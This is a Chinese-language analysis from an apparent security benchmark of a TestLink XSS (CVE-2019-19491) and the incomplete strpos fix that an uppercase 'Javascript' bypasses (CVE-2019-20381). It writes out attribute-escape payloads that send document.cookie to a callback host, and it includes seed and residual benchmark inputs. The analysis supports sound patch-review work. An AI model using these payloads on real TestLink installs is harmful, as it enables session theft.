# TestLink：javascript 只认小写

- Case：`PCBV2-0028`
- 产品：TestLink（PHP 测试用例管理；登录后的主框架页把 `reqURI` 填进 frame/iframe 的 `src`）
- 链：CVE-2019-19491（1.9.19 → 1.9.19.1 时代 / `0e3e90799`）→ CVE-2019-20381（→ 1.9.20 / `cde692895`）
- 源码对着提交 `0e3e907990f40483c0cd850744bc995011826799` 的 `index.php::initEnv()`，以及 1.9.20 上把 `strpos` 换成 `stripos` 的那一行。运行时是整仓 TestLink + Apache + MariaDB，受害者是登录后的真实会话，不是抽出来的反射函数。

2019 年 11 月 30 日，TestLink 给 `index.php` 的 `reqURI` 加了一段「sanity check」：字符串里若出现 `javascript` 就改成默认主页，并在前面拼上 `$_SESSION['basehref']`。一个月后 Mantis 0008808 / NVD CVE-2019-20381 写明：*this issue exists because of an incomplete fix for CVE-2019-19491*——`strpos` 区分大小写，非小写的 `Javascript:` 不含连续的 `javascript` 子串，守卫从不开火。

根因不只是「大小写漏了」。检查插在字符串上；真正执行脚本的是浏览器把这段**未转义**的值填进 `src="..."` 之后。下面按请求走进去、补丁改了哪几行、拼完 basehref 之后 HTML 长什么样、为什么大写 J 仍能跑，把这三层写完。

---

## 这块功能本来在干什么

登录后的 TestLink 主页是一套框架：导航一栏，主内容一栏。`index.php` 用查询参数 `reqURI` 决定主栏去哪。设计意图：这是站内相对路径，例如 `lib/general/mainPage.php`。

一次典型请求（需已登录）：

```http
GET /index.php?reqURI=lib/general/mainPage.php
```

`initEnv` 取出参数，赋给 `$gui->mainframe`，模板再写进标签：

```php
// index.php :: initEnv  (commit 0e3e90799，CVE-2019-19491 修复后)
$iParams = array("reqURI" => array(tlInputParameter::STRING_N,0,4000));
$pParams = G_PARAMS($iParams);
...
$args->reqURI = '';
if ($pParams["reqURI"] != '') {
    $args->reqURI = $pParams["reqURI"];

    // some sanity checks
    // strpos ( string $haystack , mixed $needle
    if (strpos($args->reqURI,'javascript') !== false) {
        $args->reqURI = null;
    }
}
if (null == $args->reqURI) {
    $args->reqURI = 'lib/general/mainPage.php';
}
$args->reqURI = $_SESSION['basehref'] . $args->reqURI;
...
$gui->mainframe = $args->reqURI;
```

模板侧（V0 的 1.9.19 是 `<frameset>` / `<frame src="{$gui->mainframe}">`，与 Exploit-DB 47702 一致；V1/V2 换成 `<iframe src="{$gui->mainframe}">`）**不做 HTML 转义**。Smarty 默认对这份赋值原样输出。

成功穿越之后的效果：受害者浏览器执行注入的 JS，读 `document.cookie`（里面有登录后种下的 `session=<PCBFLAG_...>`，不在 HTML 里），再打到内部 callback。flag 只在 callback dump 里出现，证明是真的脚本执行，不是反射字符串本身。

数据流：

```text
GET /index.php?reqURI=<user>
    → initEnv
         $args->reqURI = 用户字符串
         V1：strpos(..., 'javascript')     ← 只认全小写连续子串
         若命中：改成 mainPage.php
         $args->reqURI = basehref . $args->reqURI
         $gui->mainframe = $args->reqURI
    → main.tpl  src="{$gui->mainframe}"     ← 未转义
    → 浏览器解析 iframe/frame
         若 src 属性被 " 提前关掉，后面的 onload= 成为同一标签的事件处理
    → onload 读 cookie，beacon 到 callback
```

---

## 原始漏洞：reqURI 原样进 src（CVE-2019-19491，1.9.19）

1.9.19 的 `initEnv` 是一行三元：

```php
$args->reqURI = ($pParams["reqURI"] != '') ? $pParams["reqURI"] : 'lib/general/mainPage.php';
```

没有 `javascript` 检查，没有 `basehref` 前缀。`reqURI=javascript:...` 会变成 `<frame src="javascript:...">`。cxsecurity WLB-2019110139 / Exploit-DB 47702 报的就是这条。CVE-2019-19491 还列了 `archiveData.php` 的 `edit` 等其它反射点；本 case 只打 `index.php` 的 `reqURI`，因为后续那次「修不完」也发生在这里。

本 case 的 seed 不用裸 `javascript:` 导航（现代 Chromium 会拦 frame 里的 javascript: URL），而是**属性逃逸**：

```text
reqURI = javascript" onload="new Image().src='//callback:9000/c?f='+document.cookie
```

`"` 关掉 `src="`，`onload=` 挂在同一个 frame/iframe 上。onload 与 URL scheme 无关，V0 的 `<frame>` 和 V1 的 `<iframe>` 都会在加载时跑。受害者已登录，cookie 里有 flag。

---

## 维护者改了什么（CVE-2019-19491 修复，0e3e90799）

V1 把那一行三元换成一段带注释的「CWE-79」处理，并强制加上站点 `basehref`。和前后并排：

```php
// V0  1.9.19
$args->reqURI = ($pParams["reqURI"] != '') ? $pParams["reqURI"] : 'lib/general/mainPage.php';

// V1  0e3e90799                         （CVE-2019-19491，本 case 的目标）
if (strpos($args->reqURI,'javascript') !== false) {
    $args->reqURI = null;
}
...
$args->reqURI = $_SESSION['basehref'] . $args->reqURI;

// V2  cde692895 / 1.9.20                （CVE-2019-20381）
if (stripos($args->reqURI,'javascript') !== false) {
    $args->reqURI = null;
}
```

`strpos` 的字面意思：在 haystack 里找**区分大小写**的针。针是六个小写字母 `javascript`。PHP 手册把这一点写在函数签名旁；提交里的注释还特意抄了 `strpos ( string $haystack , mixed $needle`，但没有写「大小写」。

对 seed 这种全小写 `javascript"...`，它确实够用：

```text
strpos("javascript\" onload=...", "javascript") !== false
→ $args->reqURI = null
→ 回落到 lib/general/mainPage.php
→ src 变成 basehref + 默认页，没有 onload
```

这就是 v1 + `--seed` 退出码 10。callback 收不到 cookie。

补丁默认了两件事：

1. 危险 scheme / 注入标记长得像连续小写 `javascript`。
2. 即便漏过，前面的 `basehref` 也会把值变成 `http://host/...`，浏览器不会当 javascript: 跑。

第一点不成立：HTML / URL scheme 大小写不敏感，`Javascript:` 与 `javascript:` 同类。第二点对**属性逃逸**也不成立——payload 要的不是 scheme，是 `"` 提前结束 `src` 属性。`basehref` 只是拼在字符串前面，拼完之后 `"` 和 `onload=` 还在。

---

## 消毒之后，字符串怎么接到 HTML 上

V1 的 `strpos` 一结束（没命中时），同一个函数立刻做两件事：拼 `basehref`，赋给 `$gui->mainframe`。模板输出大约是：

```html
<iframe src="http://<host>/index.php所在目录/<用户字符串>" name="mainframe">
```

用户字符串里的 `"`、空格、`=` 都没有被 `htmlspecialchars`。所以：

```text
用户:  Javascript" onload="new Image().src='//callback:9000/c?f='+document.cookie

守卫:  strpos(..., 'javascript') === false   ← 大写 J，连续小写子串不存在

拼完:  http://pcb.test/.../Javascript" onload="new Image().src='...' +document.cookie

HTML:  <iframe src="http://pcb.test/.../Javascript" onload="new Image().src='...'+document.cookie">
```

浏览器看到的 `src` 在第一个 `"` 处结束（值是 `http://.../Javascript`，多半 404），**同一个 iframe** 上却有 `onload=...`。加载完成（哪怕 404）也会跑这段脚本，读当前源的 `document.cookie`。

`basehref` 对裸 `Javascript:` 导航或许有用（会变成 `http://host/Javascript:...`，不再是 javascript: scheme）；对本 case 这条 onload 链，它只是让 `src` 变成一条普通 http URL，onload 照样火。seed 和 residual 都走 onload，差别只有那一个字符。

V1 把命中守卫的值改成 `null` 再回落到 `lib/general/mainPage.php`，看起来像「失败封闭」。它封闭的是「字符串里有小写 javascript」这一种失败。`G_PARAMS` 对 `reqURI` 的类型是 `STRING_N,0,4000`：长度和「是字符串」有人管，字符类没有。`"` `=` 空格都能进 `$gui->mainframe`。模板引擎这边，TestLink 的 Smarty 对 `{$gui->mainframe}` 默认不转义——V0 换成 iframe 之后仍是同一赋值。守卫和输出编码是两层；V1 只加了前一层，还加错了匹配语义。

---

## 这个补丁挡住了什么、没挡住什么

到这里可以把「过滤器 vs 浏览器」落到具体代码：

- `initEnv` 的 `strpos($reqURI,'javascript')`：看有没有连续六个小写字母
- 浏览器的 HTML 解析器：看 `src="..."` 在哪一个 `"` 处结束、标签上还有没有事件属性

只要构造一种输入，使「连续小写 `javascript`」不出现，但 `"` + `onload=` 仍在，第一行会放行，第二行仍然执行脚本。

`Javascript` 就是这样来的。七个字符，只有首字母大写。`strpos` 从左扫，找不到全小写针。NVD 的原话是 *XSS via non-lowercase javascript: in the index.php reqURI parameter*。本 case 把 scheme 利用改成属性逃逸，但「非小写」这一处和 advisory 是同一缺口。

V2 的 commit message 写 *fix: 0008808: TestLink v1.9.19.1 - Bypass security fix for XSS at index.php*，维护者自己承认这是在绕过上一版安全修复。

---

## 残余仍然走同一条 reqURI 反射（CVE-2019-20381）

没有换参数、没有换模板、没有换登录状态。还是：

```http
GET /index.php?reqURI=Javascript%22%20onload%3D%22new%20Image().src%3D%27//callback:9000/c?f%3D%27%2Bdocument.cookie
```

`initEnv` 仍然 `strpos`；仍然拼 `basehref`；仍然未转义进 `src`。受害者会话里仍然是那枚 cookie。callback 再次收到 `session=PCBFLAG_...`。

本 case residual 与 seed **只差一个字节**（`j` → `J`）。认证：v1 + `--residual` 退出码 0，callback dump 中观察到 flag。

所以残余不是新洞面，而是同一 sink 上三件事叠在一起：子串匹配比 HTML/URL 的大小写语义窄；输出仍不转义；`basehref` 只改 scheme，不改属性边界。seed 被挡住只说明「小写那六个字母没了」，不说明「reqURI 不能再往 iframe 上挂 onload」。

字节对照（只有一个字母不同）：

```text
seed:      javascript" onload="new Image().src='//callback:9000/c?f='+document.cookie
residual:  Javascript" onload="new Image().src='//callback:9000/c?f='+document.cookie
           ^
```

`strpos` 在 seed 上返回 0，在 residual 上返回 `false`。浏览器对两段 HTML 的解析没有区别：都是 `src` 在第一个 `"` 处结束、同一标签上挂 `onload`。PHP 的匹配语言比 HTML 的属性语法更挑剔，挑剔的方向帮了注入。

---

## 后来又补了什么（CVE-2019-20381，1.9.20 / cde692895）

1.9.20 把那一行 `strpos` 换成 `stripos`：

```php
-    if (strpos($args->reqURI,'javascript') !== false) {
+    if (stripos($args->reqURI,'javascript') !== false) {
```

`stripos` 忽略大小写。`Javascript"...` 命中，值被清空，回落到 `mainPage.php`，onload 不再出现。公开建议升级到 1.9.20。

即便如此，这仍然是「在反射前找一个词」。输出依旧未转义；`vbscript:`、`data:`、纯 `"` 逃逸若不含 `javascript` 这几个字母，需要另证。本 benchmark 的 v2 只关闭「非小写 javascript」这一条 reference residual。

---

## 从这条链还能看出什么

这些不是分类标签，只是顺着代码继续看时比较自然的问题。

**维护者改错了哪一层。**  
他们改的是 `initEnv` 入口的子串。真正执行脚本的是模板里未转义的 `src="{$gui->mainframe}"`。V2 仍在同一层加码（大小写不敏感），没有在输出侧做 `htmlspecialchars(..., ENT_QUOTES)`，也没有把 `reqURI` 收成站内相对路径白名单。

**不是没有更强的处理。**  
同一段 V1 已经会拼 `basehref`、会把命中的值改成默认页。缺的是「匹配规则与浏览器对 scheme / 属性的理解一致」以及「进 HTML 之前转义」。从 V1 的 diff 只能看到加了 `strpos`；要判断补丁是否闭合，必须看到 `strpos` 区分大小写、以及模板不转义。

**同一参数、同一 `$gui->mainframe`，只换了一个字母。**  
任何把 `reqURI` 映进主框架 `src` 的主题/模板，在 1.9.19.1 上都吃这一次检查。Mantis 0008808 针对的就是这个点。

**属性逃逸让 basehref 帮不上忙。**  
补丁作者可能以为「拼上 http 前缀就不会再走 javascript:」。onload 不走 scheme。若 `reqURI` 只允许 `[A-Za-z0-9_./]`，后面那行 `strpos` 根本不会被逼去近似 XSS 防护。

**金丝雀在 cookie 里、不在页面里。**  
HTML 源码不含 `PCBFLAG_`。能在 callback 看到它，说明受害者源上真的跑了 `document.cookie`。这把「反射成功」和「脚本执行」分开了。

---

## 版本、入口、参考

| | 版本 | `initEnv` 守卫 | 模板 | 小写 `javascript"` seed | `Javascript"` residual |
|---|---|---|---|---|---|
| V0 | 1.9.19 | 无 | `<frame src>` 未转义 | onload 外带 cookie | （不必） |
| V1 | 0e3e90799 | `strpos` 小写 | `<iframe src>` 未转义 | 回落到 mainPage | onload 外带 cookie |
| V2 | 1.9.20 | `stripos` | 同上 | 挡 | 挡 |

- Web：登录后 `GET /index.php?reqURI=...`；观察在内部 callback `/dump`。
- 认证（本平台）：v0 seed 观察到 flag；v1 seed 未观察到；v1 residual 观察到。
- [CVE-2019-19491](https://nvd.nist.gov/vuln/detail/CVE-2019-19491)、[CVE-2019-20381](https://nvd.nist.gov/vuln/detail/CVE-2019-20381)（NVD 写明 incomplete fix）
- [Mantis 0008808](http://mantis.testlink.org/view.php?id=8808)
- 修复提交：[0e3e90799](https://github.com/TestLinkOpenSourceTRMS/testlink-code/commit/0e3e907990f40483c0cd850744bc995011826799)、[cde692895](https://github.com/TestLinkOpenSourceTRMS/testlink-code/commit/cde692895e425731e6951d265a01ca6425a7c26e)
- [cxsecurity WLB-2019110139](https://cxsecurity.com/issue/WLB-2019110139)
